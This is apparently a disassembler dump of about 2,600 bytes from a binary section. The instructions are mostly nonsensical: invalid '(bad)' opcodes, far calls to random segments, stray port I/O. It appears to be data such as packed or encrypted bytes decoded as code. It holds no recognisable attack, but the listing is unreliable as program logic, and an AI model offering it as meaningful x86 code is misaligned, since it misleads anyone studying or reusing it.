  41a7a9:	and    al,0x84
  41a7ab:	mov    edi,0x9de99338
  41a7b0:	stc    
  41a7b1:	or     cl,bh
  41a7b3:	fimul  WORD PTR [esi-0x3f]
  41a7b6:	jle    0x41a76d
  41a7b8:	lahf   
  41a7b9:	jbe    0x41a787
  41a7bb:	stos   DWORD PTR es:[edi],eax
  41a7bc:	cmp    esi,DWORD PTR [eax]
  41a7be:	fldcw  WORD PTR [edi]
  41a7c0:	sbb    esp,ecx
  41a7c2:	add    DWORD PTR ds:[edi-0x4b],esp
  41a7c6:	clc    
  41a7c7:	push   ebx
  41a7c8:	dec    eax
  41a7c9:	enter  0x516a,0xb7
  41a7cd:	cmp    al,0x36
  41a7cf:	sbb    ebx,DWORD PTR [ebx]
  41a7d1:	mov    ss,WORD PTR [ecx+0x6a172afe]
  41a7d7:	sti    
  41a7d8:	pop    edi
  41a7d9:	int3   
  41a7da:	lahf   
  41a7db:	mov    eax,0x3210aa70
  41a7e0:	jmp    0x41a76d
  41a7e2:	dec    edi
  41a7e3:	into   
  41a7e4:	or     BYTE PTR [edi-0x47147781],0x3a
  41a7eb:	or     al,0x19
  41a7ed:	aad    0x0
	...
  41a853:	add    BYTE PTR [eax],al
  41a855:	add    bl,dh
  41a857:	xchg   edi,eax
  41a858:	jae    0x41a7e1
  41a85a:	ja     0x41a843
  41a85c:	div    edi
  41a85e:	mov    ds:0xdc5327ca,al
  41a863:	adc    al,0x48
  41a865:	xchg   edx,eax
  41a866:	addr16 sbb eax,0x1000001
  41a86c:	add    BYTE PTR [eax],al
  41a86e:	clc    
  41a86f:	int    0x60
  41a871:	jge    0x41a815
  41a873:	sub    BYTE PTR [eax-0xc],0xdb
  41a877:	arpl   WORD PTR [edi+0x33],dx
  41a87a:	xchg   esp,eax
  41a87b:	call   0x3ac7:0x34e05ad4
  41a882:	enter  0x16af,0xc2
  41a886:	sub    bh,dh
  41a888:	mov    ecx,0x9abd8d9c
  41a88d:	dec    ebp
  41a88e:	das    
  41a88f:	dec    ebx
  41a890:	out    dx,eax
  41a891:	xchg   ecx,eax
  41a892:	int3   
  41a893:	mov    al,0xf7
  41a895:	dec    ebx
  41a896:	and    al,0xdd
  41a898:	dec    esp
  41a899:	and    ecx,ebp
  41a89b:	and    cl,BYTE PTR [ebx]
  41a89d:	sbb    DWORD PTR [ecx-0x5b44fee8],ecx
  41a8a3:	or     al,0x7
  41a8a5:	jp     0x41a90b
  41a8a7:	add    eax,0x8b2668b5
  41a8ac:	stc    
  41a8ad:	jp     0x41a88c
  41a8af:	das    
  41a8b0:	js     0x41a907
  41a8b2:	(bad)  
  41a8b4:	addr16 or eax,0x42a7f8ff
  41a8ba:	jp     0x41a879
  41a8bc:	enter  0x724e,0xc8
  41a8c0:	inc    esi
  41a8c1:	xchg   ebx,eax
  41a8c2:	jbe    0x41a8eb
  41a8c4:	add    al,BYTE PTR [ecx+edx*8-0x5fbe8edb]
  41a8cb:	and    ah,BYTE PTR [esi+0x3400edc6]
  41a8d1:	jno    0x41a8e7
  41a8d3:	adc    al,ch
  41a8d5:	inc    ebp
  41a8d6:	dec    esp
  41a8d7:	mov    ah,0x4b
  41a8d9:	and    cl,dl
  41a8db:	stc    
  41a8dc:	cmp    ecx,0x9431fdbd
  41a8e2:	xchg   esp,eax
  41a8e3:	mov    DWORD PTR [edi+edx*8],edi
  41a8e6:	push   eax
  41a8e7:	mov    esp,0xe7f12835
  41a8ec:	aam    0x1e
  41a8ee:	in     al,dx
  41a8ef:	cmp    al,0xeb
  41a8f1:	je     0x41a91d
  41a8f3:	xor    BYTE PTR [eax-0x77],ch
  41a8f6:	adc    al,0x89
  41a8f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8f9:	call   0x9d45:0xc41c040e
  41a900:	btr    DWORD PTR [edx-0x4c],esi
  41a904:	aad    0xcb
  41a906:	retf   
  41a907:	lods   al,BYTE PTR ds:[esi]
  41a908:	jmp    0x7db472dc
  41a90d:	mov    esi,0xa0355ad4
  41a912:	jl     0x41a927
  41a914:	adc    esp,ebp
  41a916:	sub    eax,0x662bf143
  41a91b:	cmp    ebx,esp
  41a91d:	daa    
  41a91e:	xor    edi,esi
  41a920:	rcl    DWORD PTR [edi],0x99
  41a923:	ins    DWORD PTR es:[edi],dx
  41a924:	sbb    cl,al
  41a926:	push   ecx
  41a927:	pinsrw mm7,ebp,0xa2
  41a92b:	(bad)  
  41a92c:	jne    0x41a971
  41a92e:	sahf   
  41a92f:	sbb    al,0x18
  41a931:	add    eax,0xaef33c7b
  41a936:	rcl    DWORD PTR [edi-0x7a5f2a7f],0x4a
  41a93d:	fidivr WORD PTR [eax+0x4e]
  41a940:	cli    
  41a941:	mov    eax,0x4052a850
  41a946:	bound  ebp,QWORD PTR [ebx+0x71]
  41a949:	pop    ss
  41a94a:	jl     0x41a95e
  41a94c:	(bad)  
  41a94d:	ret    0xdd24
  41a950:	dec    ebp
  41a951:	mov    bh,0x98
  41a953:	cmp    BYTE PTR [ecx+0x42910e63],cl
  41a959:	arpl   WORD PTR [eax+0x56aaa317],cx
  41a95f:	push   ss
  41a960:	iret   
  41a961:	bound  edx,QWORD PTR [esi+ebp*2-0x18]
  41a965:	or     edx,DWORD PTR [ecx-0x58537a73]
  41a96b:	mov    edi,ecx
  41a96d:	jecxz  0x41a96f
	...
  41a9d3:	add    BYTE PTR [eax],al
  41a9d5:	add    BYTE PTR ds:0xcf4a867e,dh
  41a9db:	cli    
  41a9dc:	std    
  41a9dd:	jg     0x41aa2d
  41a9df:	push   edx
  41a9e0:	pushf  
  41a9e1:	dec    esp
  41a9e2:	and    al,0x20
  41a9e4:	jbe    0x41a998
  41a9e6:	addr16 push ds
  41a9e8:	add    DWORD PTR [eax],eax
  41a9ea:	add    BYTE PTR [ecx],al
  41a9ec:	add    BYTE PTR [eax],al
  41a9ee:	(bad)  
  41a9f0:	lds    esp,FWORD PTR [edx+0x774f9264]
  41a9f6:	ror    DWORD PTR [ecx-0x5f],0x62
  41a9fa:	and    al,0x4
  41a9fc:	mov    edi,0xf4d5fd8a
  41aa01:	pop    ss
  41aa02:	into   
  41aa03:	mov    esi,0xb1df69d
  41aa08:	mov    al,ds:0xbe18d76
  41aa0d:	xchg   ecx,eax
  41aa0e:	stos   DWORD PTR es:[edi],eax
  41aa0f:	pop    ebp
  41aa10:	and    BYTE PTR [edx-0x50],bh
  41aa13:	or     ah,dl
  41aa15:	in     al,dx
  41aa16:	xchg   ebx,eax
  41aa17:	ds es xchg ecx,eax
  41aa1a:	shl    dh,0x24
  41aa1d:	push   edi
  41aa1e:	sbb    BYTE PTR [ebx-0x37ca3eb0],0xad
  41aa25:	fwait
  41aa26:	jl     0x41aa9c
  41aa28:	push   eax
  41aa29:	js     0x41a9d4
  41aa2b:	mov    ecx,0xc8cf44e0
  41aa30:	popf   
  41aa31:	cmp    DWORD PTR [esp+eax*8],esp
  41aa34:	imul   esp,ecx,0xb8848e65
  41aa3a:	shl    DWORD PTR [edx],1
  41aa3c:	add    al,0xd9
  41aa3e:	in     al,0xf2
  41aa40:	dec    esi
  41aa42:	out    0x77,eax
  41aa44:	push   edx
  41aa45:	stc    
  41aa46:	das    
  41aa47:	daa    
  41aa48:	cld    
  41aa49:	pop    edi
  41aa4a:	outs   dx,BYTE PTR ds:[esi]
  41aa4b:	inc    edi
  41aa4c:	ret    0x8bb3
  41aa4f:	push   edi
  41aa50:	xchg   esi,eax
  41aa51:	jge    0x41aa86
  41aa53:	mov    edi,0x806754a0
  41aa58:	mov    bl,0x97
  41aa5a:	call   0x2067:0xac964ef7
  41aa61:	add    al,0xfd
  41aa63:	and    BYTE PTR [ecx-0x5a],bh
  41aa66:	dec    ecx
  41aa67:	add    esi,DWORD PTR [edi+0x72ecb69d]
  41aa6d:	mov    edi,0xe98b7e88
  41aa72:	cwde   
  41aa73:	or     BYTE PTR [ebp-0x79],dh
  41aa76:	jl     0x41aa12
  41aa78:	fistp  QWORD PTR [edx+0x75ca089e]
  41aa7e:	mov    BYTE PTR [ecx],dh
  41aa80:	cmp    dh,cl
  41aa82:	cmp    eax,0x2ba2b360
  41aa87:	loopne 0x41aadf
  41aa89:	lea    eax,[ecx]
  41aa8b:	aas    
  41aa8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa8d:	fcmovb st,st(4)
  41aa8f:	loopne 0x41aa43
  41aa91:	fcom   DWORD PTR [ecx+0x6f]
  41aa94:	stc    
  41aa95:	dec    esi
  41aa96:	test   al,0xc0
  41aa98:	cvtdq2ps xmm6,xmm5
  41aa9b:	mov    ch,0xf1
  41aa9d:	fisttp WORD PTR ds:0xa1c05685
  41aaa3:	mov    esp,0xef901599
  41aaa8:	cmp    BYTE PTR [ebp-0x71],bl
  41aaab:	repnz pop DWORD PTR cs:[ecx-0x302650fb]
  41aab3:	sbb    ebx,edi
  41aab5:	stos   DWORD PTR es:[edi],eax
  41aab6:	in     al,0xa3
  41aab8:	rol    BYTE PTR [esi+0x6264d2f2],1
  41aabe:	inc    eax
  41aabf:	sti    
  41aac0:	mov    BYTE PTR [edx+0x6f],ah
  41aac3:	pop    esp
  41aac4:	adc    al,0x21
  41aac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aac7:	shr    BYTE PTR [esi-0x56],cl
  41aaca:	lods   eax,DWORD PTR ds:[esi]
  41aacb:	in     eax,0xb5
  41aacd:	cdq    
  41aace:	mov    ecx,0x27d72ced
  41aad3:	jp     0x41ab3b
  41aad5:	shr    ecx,1
  41aad7:	add    DWORD PTR [ebx+0x153215f8],eax
  41aadd:	int    0x4b
  41aadf:	cmp    eax,DWORD PTR [ebp-0x52]
  41aae2:	pop    eax
  41aae3:	and    DWORD PTR [eax],ebx
  41aae5:	(bad)  
  41aae6:	cld    
  41aae7:	in     eax,0x4d
  41aae9:	out    0x3c,eax
  41aaeb:	aas    
  41aaec:	sub    eax,0x21
	...
  41ab55:	add    bh,dh
  41ab57:	add    esp,ebx
  41ab59:	mov    ah,0xfe
  41ab5b:	std    
  41ab5c:	inc    DWORD PTR [ebx+0x5f]
  41ab5f:	sbb    BYTE PTR [esi+0x43],ah
  41ab62:	popf   
  41ab63:	cmp    dl,BYTE PTR [ebx+0x60]
  41ab66:	addr16 pop ds
  41ab68:	add    DWORD PTR [eax],eax
  41ab6a:	add    BYTE PTR [ecx],al
  41ab6c:	add    BYTE PTR [eax],al
  41ab6e:	xchg   esp,eax
  41ab6f:	sbb    DWORD PTR [esp+esi*2],ecx
  41ab72:	repnz test ebx,ecx
  41ab75:	adc    DWORD PTR [ebx+0x1508b0fa],ebp
  41ab7b:	xchg   esp,eax
  41ab7c:	retf   
  41ab7d:	add    BYTE PTR [esi+0x25],bl
  41ab80:	jge    0x41abbf
  41ab82:	jo     0x41ab41
  41ab84:	nop
  41ab85:	inc    edi
  41ab86:	jl     0x41ab16
  41ab88:	frstor ds:0x4a2c623d
  41ab8e:	xor    al,0xb1
  41ab90:	mov    dl,0x2e
  41ab92:	lods   al,BYTE PTR ds:[esi]
  41ab93:	dec    edi
  41ab94:	xchg   DWORD PTR [edx+eiz*8-0x50e71634],ebp
  41ab9b:	hlt    
  41ab9c:	push   ds
  41ab9d:	lds    esi,FWORD PTR [edx+0x4]
  41aba0:	sbb    BYTE PTR [ecx+0x63],dl
  41aba3:	sbb    DWORD PTR [eax],esi
  41aba5:	xor    BYTE PTR [esi],bh
  41aba7:	pop    ebx
  41aba8:	mov    bl,0xc3
  41abaa:	push   eax
  41abab:	add    cl,BYTE PTR [ebp+0x509e1c51]
  41abb1:	sti    
  41abb2:	jo     0x41abd3
  41abb4:	mov    edx,ss
  41abb6:	cmp    al,0x90
  41abb8:	xor    eax,0xe7d13c5
  41abbd:	mov    eax,ds:0x1208bba7
  41abc2:	inc    DWORD PTR [esi+0x63cc68be]
  41abc8:	inc    esi
  41abc9:	test   al,0x34
  41abcb:	jmp    0x16ca:0xddfacfc5
  41abd2:	dec    esp
  41abd3:	stos   DWORD PTR es:[edi],eax
  41abd4:	push   0xe7613982
  41abd9:	fwait
  41abda:	bnd jo 0x41abcf
  41abdd:	xchg   BYTE PTR [esi-0x5f0d5662],bl
  41abe3:	ja     0x41ac63
  41abe5:	mov    eax,0x8f8bbe99
  41abea:	out    0x63,eax
  41abec:	inc    esp
  41abed:	les    esp,FWORD PTR [ecx+edx*4+0x306b3909]
  41abf4:	sub    BYTE PTR [ebp-0xf],bl
  41abf7:	lds    esp,FWORD PTR [esi+eax*8]
  41abfa:	xor    BYTE PTR [esi],al
  41abfc:	mov    WORD PTR [esi],ss
  41abfe:	mov    dl,0x5
  41ac00:	xchg   di,ax
  41ac02:	add    edx,DWORD PTR [ecx+0x2]
  41ac05:	xchg   esp,eax
  41ac06:	pop    ss
  41ac07:	add    ebp,DWORD PTR [esi-0x2e]
  41ac0a:	fldcw  WORD PTR [ebp+0x6f02564c]
  41ac10:	push   cs
  41ac11:	call   0x413c:0xd2f3947b
  41ac18:	fadd   DWORD PTR [eax+0x78]
  41ac1b:	cmc    
  41ac1c:	pop    esi
  41ac1d:	push   edi
  41ac1e:	mov    bh,0x97
  41ac20:	cli    
  41ac21:	inc    eax
  41ac22:	je     0x41abfd
  41ac24:	into   
  41ac25:	outs   dx,DWORD PTR ds:[esi]
  41ac26:	outs   dx,BYTE PTR ds:[esi]
  41ac27:	in     eax,dx
  41ac28:	ss inc edx
  41ac2a:	xchg   edx,eax
  41ac2b:	dec    esp
  41ac2c:	imul   ecx,DWORD PTR [edi-0x2a34a324],0x82759638
  41ac36:	js     0x41abda
  41ac38:	jle    0x41ac25
  41ac3a:	outs   dx,BYTE PTR ds:[esi]
  41ac3b:	sub    ebx,DWORD PTR [edx]
  41ac3d:	mov    ds:0xa45d3ea9,eax
  41ac42:	adc    al,0xa5
  41ac44:	jp     0x41abce
  41ac46:	push   ebx
  41ac47:	jbe    0x41ac77
  41ac49:	out    0x86,eax
  41ac4b:	pop    es
  41ac4c:	pop    esi
  41ac4d:	call   0xd4fb:0x846d78cf
  41ac54:	push   cs
  41ac55:	xchg   ebp,eax
  41ac56:	sbb    eax,0x9d0a9f14
  41ac5b:	or     BYTE PTR [eax],al
  41ac5d:	xchg   ecx,eax
  41ac5e:	loop   0x41ac64
  41ac60:	mov    bl,0xea
  41ac62:	and    eax,0x44f1588c
  41ac67:	jne    0x41aca6
  41ac69:	in     al,dx
  41ac6a:	scas   eax,DWORD PTR es:[edi]
  41ac6b:	push   ds
  41ac6c:	aas    
  41ac6d:	leave  
	...
  41acd6:	push   0x49
  41acd8:	es cmp al,0x27
  41acdb:	jg     0x41ad57
  41acdd:	pop    edi
  41acde:	or     al,0x44
  41ace0:	xor    ah,BYTE PTR [edx+ecx*4-0x6a]
  41ace4:	pop    eax
  41ace5:	pop    ecx
  41ace6:	and    BYTE PTR [bx+di],al
  41ace9:	add    BYTE PTR [eax],al
  41aceb:	add    DWORD PTR [eax],eax
  41aced:	add    BYTE PTR [edi+0x1c],bl
  41acf0:	mov    eax,ds:0xea365ae0
  41acf5:	aaa    
  41acf6:	fwait
  41acf7:	mov    ah,0x89
  41acf9:	fwait
  41acfa:	pop    ebp
  41acfb:	jl     0x41ace4
  41acfd:	dec    eax
  41acfe:	int3   
  41acff:	outs   dx,BYTE PTR ds:[esi]
  41ad00:	and    BYTE PTR [edi],dh
  41ad02:	lea    ebx,[edi+edi*2+0x46]
  41ad06:	enter  0xe08f,0x76
  41ad0a:	or     cl,dl
  41ad0c:	call   0x96a9774f
  41ad11:	rol    BYTE PTR [eax-0x1],1
  41ad14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad15:	retf   
  41ad16:	lea    ebx,[ebp+0x2b7b7eb9]
  41ad1c:	(bad)  
  41ad1d:	int3   
  41ad1e:	std    
  41ad1f:	and    esp,ebx
  41ad21:	jecxz  0x41ad75
  41ad23:	fsubrp st(6),st
  41ad25:	loope  0x41ad5d
  41ad27:	aam    0x14
  41ad29:	stc    
  41ad2a:	packssdw mm0,QWORD PTR [ecx]
  41ad2d:	rcl    al,0x48
  41ad30:	mov    esp,0xe3494d46
  41ad35:	pop    ebx
  41ad36:	mov    edi,0x5a54f0ed
  41ad3b:	daa    
  41ad3c:	in     eax,0xe4
  41ad3e:	ins    BYTE PTR es:[edi],dx
  41ad3f:	pop    es
  41ad40:	xor    ecx,DWORD PTR [ebp+0x696063e9]
  41ad46:	test   eax,0xd618955
  41ad4b:	(bad)  
  41ad4c:	out    0xa5,eax
  41ad4e:	xchg   esi,eax
  41ad4f:	je     0x41ad31
  41ad51:	loope  0x41ada5
  41ad53:	push   ecx
  41ad54:	scas   al,BYTE PTR es:[edi]
  41ad55:	jae    0x41ad85
  41ad57:	jmp    0x358b:0x1e237a03
  41ad5e:	jge    0x41ad15
  41ad60:	push   esp
  41ad61:	mov    ds:0xbfabbb67,eax
  41ad66:	adc    edi,esp
  41ad68:	mov    ds:0xd616afc0,al
  41ad6d:	mov    ds:0x28fd6659,al
  41ad72:	(bad)  
  41ad74:	sbb    DWORD PTR [ebx-0x4ab3dd29],eax
  41ad7a:	push   es
  41ad7b:	xchg   ecx,eax
  41ad7c:	mov    eax,ds:0xf25cf87
  41ad81:	test   al,0xb5
  41ad83:	hlt    
  41ad84:	jge    0x41ad1b
  41ad86:	inc    eax
  41ad87:	mov    WORD PTR [ebx+0x1af536a0],cs
  41ad8d:	and    al,0x38
  41ad8f:	mov    DWORD PTR [ebp+0x1274c022],0x4a4493b0
  41ad99:	(bad)  
  41ad9a:	push   ss
  41ad9b:	cs sbb dl,0x7b
  41ad9f:	sub    eax,0x98997732
  41ada4:	sar    DWORD PTR [ebx],0x8c
  41ada7:	popa   
  41ada8:	cmp    BYTE PTR [eax],al
  41adaa:	sub    al,0xe4
  41adac:	sub    bl,0x72
  41adaf:	shl    BYTE PTR [ebp-0x513b047d],cl
  41adb5:	in     al,dx
  41adb6:	push   0xa8cf7f98
  41adbb:	loope  0x41ada2
  41adbd:	fist   WORD PTR [ebp*2+0x43fde042]
  41adc4:	dec    edi
  41adc5:	jnp    0x41ae02
  41adc7:	pop    esp
  41adc8:	jle    0x41add9
  41adca:	call   0xf572:0x607bc531
  41add1:	inc    esi
  41add2:	mov    dl,0xe3
  41add4:	cmp    dh,BYTE PTR [esi+0x4136e490]
  41adda:	fdiv   DWORD PTR [edx+eax*4-0x10]
  41adde:	xor    bl,BYTE PTR [edx-0x2a67c268]
  41ade4:	dec    esp
  41ade5:	test   DWORD PTR [edi-0x14],esi
  41ade8:	sbb    BYTE PTR [esi+0x1a],ah
  41adeb:	adc    al,0x85
  41aded:	test   BYTE PTR [eax],al
	...
  41ae53:	add    BYTE PTR [eax],al
  41ae55:	add    BYTE PTR [ebp-0x8],dl
  41ae58:	or     DWORD PTR [esi-0x4280053],ebx
  41ae5e:	dec    edi
  41ae5f:	push   eax
  41ae60:	cmp    DWORD PTR [eax+ebp*1+0x67b6dcea],esp
  41ae67:	and    DWORD PTR [ecx],eax
  41ae69:	add    BYTE PTR [eax],al
  41ae6b:	add    DWORD PTR [eax],eax
  41ae6d:	add    cl,ch
  41ae6f:	or     DWORD PTR [esi+ebp*2-0x7b0ee156],ecx
  41ae76:	add    eax,0x448e214f
  41ae7b:	adc    ebp,ebx
  41ae7d:	into   
  41ae7e:	ret    
  41ae7f:	jecxz  0x41aed6
  41ae81:	push   ds
  41ae82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae83:	aad    0xb4
  41ae85:	xor    esi,edi
  41ae87:	pusha  
  41ae88:	jle    0x41ae1d
  41ae8a:	mov    dl,0x89
  41ae8c:	scas   al,BYTE PTR es:[edi]
  41ae8d:	test   eax,0x7b6f84de
  41ae92:	loop   0x41ae8c
  41ae94:	lock dec ebx
  41ae96:	mov    WORD PTR [esi+0x688610e6],gs
  41ae9c:	leave  
  41ae9d:	adc    eax,0xaf6a53a5
  41aea2:	shl    BYTE PTR [edx],0x7d
  41aea5:	pop    ss
  41aea6:	test   DWORD PTR [edi-0x7],edx
  41aea9:	push   esi
  41aeaa:	dec    ecx
  41aeab:	out    0x1d,al
  41aead:	push   ebp
  41aeae:	or     BYTE PTR [ecx-0x6],bl
  41aeb1:	dec    edi
  41aeb2:	sbb    DWORD PTR [ebx+0x6],0xaa5cf29e
  41aeb9:	cwde   
  41aeba:	cmp    DWORD PTR [edi],edx
  41aebc:	xchg   edi,eax
  41aebd:	loop   0x41ae96
  41aebf:	retf   
  41aec0:	gs out dx,al
  41aec2:	adc    cl,BYTE PTR [ebp-0x16224a2b]
  41aec8:	into   
  41aec9:	inc    ecx
  41aeca:	mov    DWORD PTR [edi+edx*8],esp
  41aecd:	push   esp
  41aece:	dec    esp
  41aecf:	mov    bl,0xa
  41aed1:	pop    ebp
  41aed2:	jb     0x41ae96
  41aed4:	gs push ecx
  41aed6:	cmp    DWORD PTR [ecx],ebp
  41aed8:	push   0x53
  41aeda:	inc    edx
  41aedb:	adc    DWORD PTR [ecx-0x33],0x519339cb
  41aee2:	pop    ebx
  41aee3:	cmp    ah,BYTE PTR [eax-0x65a35e7b]
  41aee9:	lahf   
  41aeea:	cmp    eax,0x8b4e627a
  41aeef:	cmp    esi,DWORD PTR [edx+0x6a]
  41aef2:	or     BYTE PTR [ebp+0x5a2f36be],bl
  41aef8:	jne    0x41af26
  41aefa:	cmp    ecx,DWORD PTR [ebx]
  41aefc:	das    
  41aefd:	push   0x6fb9ba98
  41af02:	inc    esi
  41af03:	jbe    0x41aeb6
  41af05:	push   ebx
  41af06:	push   ecx
  41af07:	repz adc cl,BYTE PTR [ebx]
  41af0a:	sub    al,0xc2
  41af0c:	or     DWORD PTR [ebx+0x68],ecx
  41af0f:	lahf   
  41af10:	and    cl,ch
  41af12:	out    dx,eax
  41af13:	jecxz  0x41af5a
  41af15:	mov    WORD PTR [edx-0x80291f5],ss
  41af1b:	xchg   edi,eax
  41af1c:	pop    edx
  41af1d:	mov    edi,0xfb57cc7
  41af22:	mov    al,ds:0x6a65669a
  41af27:	lock imul esp,DWORD PTR ds:[ebx+0x480be4f1],0xc
  41af30:	bnd js 0x41af61
  41af33:	repz xor eax,0x23a68941
  41af39:	add    DWORD PTR [ebp+0x702d9163],esi
  41af3f:	mov    ds:0xf15ea1f6,al
  41af44:	or     esp,DWORD PTR [esi+0x6c8704d4]
  41af4a:	rol    DWORD PTR [ecx],cl
  41af4c:	cs scas eax,DWORD PTR es:[edi]
  41af4e:	mov    al,0x69
  41af50:	or     BYTE PTR [ebx-0x355d33fe],bh
  41af56:	xchg   esp,eax
  41af57:	je     0x41afd6
  41af59:	sub    al,0xc6
  41af5b:	xchg   ebp,eax
  41af5c:	and    eax,0x435c4d2f
  41af61:	cmp    BYTE PTR [esi],cl
  41af63:	and    BYTE PTR [ecx],bh
  41af65:	add    DWORD PTR [edx+edi*2+0x38975a3e],eax
  41af6c:	mov    DWORD PTR [esi],edi
	...
  41afd6:	(bad)  
  41afd9:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41afdf:	mov    ecx,0xe20044ee
  41afe4:	in     eax,0x41
  41afe6:	and    al,BYTE PTR [bx+di]
  41afe9:	add    BYTE PTR [eax],al
  41afeb:	add    DWORD PTR [eax],eax
  41afed:	add    BYTE PTR [ebp+0x3a],cl
  41aff0:	out    dx,eax
  41aff1:	mov    BYTE PTR ds:[eax-0x388a6e4d],dh
  41aff8:	cmc    
  41aff9:	xor    dh,BYTE PTR [edi-0x48]
  41affc:	stc    
  41affd:	jmp    0x41af87
  41afff:	or     edx,ebp
  41b001:	pushf  
  41b002:	call   0xe693:0x268f2bfa
  41b009:	scas   eax,DWORD PTR es:[edi]
  41b00a:	cwde   
  41b00b:	xchg   al,al
  41b00d:	jp     0x41afc5
  41b00f:	push   esp
  41b010:	adc    edi,DWORD PTR [ebp-0x37b70a6e]
  41b016:	call   0xe1e59fa9
  41b01b:	jns    0x41b00b
  41b01d:	inc    edx
  41b01e:	adc    BYTE PTR ds:0x7a40616e,bl
  41b024:	jno    0x41b072
  41b026:	leave  
  41b027:	iret   
  41b028:	dec    edx
  41b029:	imul   ebp,DWORD PTR [ebp-0x5578be14],0x1
  41b030:	adc    al,BYTE PTR [edi]
  41b032:	add    BYTE PTR [ebx+edi*2],al
  41b035:	push   es
  41b036:	and    DWORD PTR [ebx],ebp
  41b038:	push   0x21
  41b03a:	adc    eax,0x2505fe15
  41b03f:	dec    edx
  41b040:	push   esi
  41b041:	xchg   esi,eax
  41b042:	scas   eax,DWORD PTR es:[edi]
  41b043:	in     al,dx
  41b044:	repnz mov ecx,0x82348c33
  41b04a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b04b:	(bad)  
  41b04d:	inc    esi
  41b04e:	xchg   ebp,eax
  41b04f:	mov    dh,0x7a
  41b051:	lds    ebx,FWORD PTR [eax-0x370cbad]
  41b057:	(bad)  
  41b058:	cmc    
  41b059:	or     eax,0xc998f61
  41b05e:	lea    eax,[ebx-0x7a]
  41b061:	ins    DWORD PTR es:[edi],dx
  41b062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b063:	int3   
  41b064:	or     eax,0xad50ed88
  41b069:	dec    ebp
  41b06a:	(bad)  
  41b06b:	stc    
  41b06c:	loopne 0x41b0af
  41b06e:	dec    BYTE PTR [edi-0x37]
  41b071:	pop    ss
  41b072:	loope  0x41b0b7
  41b074:	sbb    DWORD PTR [ebp-0x3da2bf45],ebx
  41b07a:	daa    
  41b07b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b07c:	mov    cl,0x66
  41b07e:	xlat   BYTE PTR ds:[ebx]
  41b07f:	xor    al,0x9a
  41b081:	adc    esp,ecx
  41b083:	mov    dh,0xa2
  41b085:	test   al,0xd6
  41b087:	add    al,0xea
  41b089:	xor    eax,0xb331ed3
  41b08e:	aaa    
  41b08f:	(bad)  
  41b090:	fcmovbe st,st(0)
  41b092:	fdiv   QWORD PTR [esi-0x27]
  41b095:	sbb    eax,0x693ff280
  41b09a:	mov    eax,0xe9f1eb82
  41b09f:	add    DWORD PTR [edi],eax
  41b0a1:	fiadd  DWORD PTR [ebx+0x3]
  41b0a4:	xchg   ecx,eax
  41b0a5:	imul   esi,DWORD PTR [ebx-0x7f],0x399456b6
  41b0ac:	adc    eax,0x105ded4e
  41b0b1:	mov    esi,0x974d3da1
  41b0b6:	lds    edi,FWORD PTR [eax+0x4a81b47]
  41b0bc:	mov    al,ds:0x47a33282
  41b0c1:	mov    al,ds:0x14bd221b
  41b0c6:	test   BYTE PTR [edi-0x32a4d312],0x4d
  41b0cd:	loope  0x41b06a
  41b0cf:	inc    edx
  41b0d0:	inc    ebx
  41b0d1:	xchg   DWORD PTR [edx],edi
  41b0d3:	lea    esp,[ebx-0x12ca32e]
  41b0d9:	loopne 0x41b072
  41b0db:	jne    0x41b14e
  41b0dd:	out    0xb8,eax
  41b0df:	fisub  WORD PTR [ebp+ecx*8+0x1d]
  41b0e3:	rol    ah,1
  41b0e5:	mov    edx,0xb0d88540
  41b0ea:	xchg   DWORD PTR [edx+0x2a4f],esi
	...
  41b154:	add    BYTE PTR [eax],al
  41b156:	(bad)  
  41b157:	ficom  WORD PTR [eax]
  41b159:	stos   DWORD PTR es:[edi],eax
  41b15a:	sbb    bh,ch
  41b15c:	(bad)  
  41b15d:	call   DWORD PTR [edx+edx*8+0x75]
  41b161:	mov    edi,0xa9b5381f
  41b166:	and    eax,DWORD PTR [bx+di]
  41b169:	add    BYTE PTR [eax],al
  41b16b:	add    DWORD PTR [eax],eax
  41b16d:	add    BYTE PTR [esi-0xd],dl
  41b170:	ins    BYTE PTR es:[edi],dx
  41b171:	retf   0xad70
  41b174:	lds    eax,FWORD PTR [bx+si+0x7c]
  41b178:	jecxz  0x41b178
  41b17a:	push   ss
  41b17b:	es out dx,eax
  41b17d:	mov    ebx,0xd6846d92
  41b182:	jb     0x41b10a
  41b184:	fincstp 
  41b186:	and    DWORD PTR [edi-0x16],ecx
  41b189:	adc    DWORD PTR [eax-0x5a],0x6b
  41b18d:	stc    
  41b18e:	xor    eax,0xb3f4a28c
  41b193:	ffree  st(0)
  41b195:	and    al,0x5
  41b197:	mov    esi,0x8d16c535
  41b19c:	xor    bx,di
  41b19f:	add    edi,DWORD PTR [edi+0x2544764a]
  41b1a5:	jno    0x41b164
  41b1a7:	mov    cl,0xa8
  41b1a9:	push   ebx
  41b1aa:	mov    WORD PTR [ebp+0x1ea8bb35],gs
  41b1b0:	lds    ebx,FWORD PTR [ebp-0x29aaf790]
  41b1b6:	mov    ds:0xb8719d0a,eax
  41b1bb:	jae    0x41b13d
  41b1bd:	add    BYTE PTR [edi],cl
  41b1bf:	inc    esi
  41b1c0:	loop   0x41b166
  41b1c2:	into   
  41b1c3:	mov    esp,0x8755986
  41b1c8:	popw   ss
  41b1ca:	xchg   esi,eax
  41b1cb:	or     al,0x83
  41b1cd:	sub    ebp,esp
  41b1cf:	int    0xd6
  41b1d1:	iret   
  41b1d2:	int    0xb4
  41b1d4:	or     esi,DWORD PTR [eax+0x6b8e23f5]
  41b1da:	out    dx,al
  41b1db:	in     al,0x29
  41b1dd:	imul   ebx,DWORD PTR [ebx+eax*1],0xeac7ef7
  41b1e4:	mov    ds:0x25ebcf3d,eax
  41b1e9:	imul   DWORD PTR [esi]
  41b1eb:	sub    BYTE PTR [ebx],0xe3
  41b1ee:	push   esp
  41b1ef:	and    al,0x33
  41b1f1:	mov    bh,ah
  41b1f3:	ds push ds
  41b1f5:	mov    dh,0x4b
  41b1f7:	cmp    BYTE PTR [ecx+0x6fcaa0ec],cl
  41b1fd:	or     eax,0x40a33b73
